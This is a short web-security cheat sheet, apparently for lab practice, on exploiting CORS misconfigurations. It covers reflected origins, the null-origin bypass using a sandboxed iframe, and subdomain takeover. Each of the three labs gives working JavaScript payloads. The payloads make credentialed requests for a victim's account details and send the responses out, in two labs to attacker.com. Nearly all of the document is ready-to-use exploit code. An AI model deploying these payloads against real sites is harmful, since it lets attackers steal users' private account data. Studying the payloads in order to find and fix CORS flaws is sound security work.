---

### 🌐 **CORS (Cross-Origin Resource Sharing) Cheat Sheet**  

---
---

## **Payloads y Ataques Relacionados**

### **Lab 1: Origin Manipulation**
**Request:**
```http
Origin: https://gustavo.com
```
**Response:**
```http
Access-Control-Allow-Origin: https://gustavo.com
Access-Control-Allow-Credentials: true
```

**Exploitation:**
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>
```

---

### **Lab 2: Origin Null Bypass**
**Request:**
```http
Origin: null
```
**Response:**
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploitation:**
```html
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('https://attacker.com/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>"></iframe>
```

---

### **Lab 3: Subdomain Takeover with CORS**
**Request:**
```http
Origin: https://gustavo.target.com
```
**Response:**
```http
Access-Control-Allow-Origin: https://gustavo.target.com
Access-Control-Allow-Credentials: true
```

**Exploitation:**
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('https://attacker.com/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>
```

---

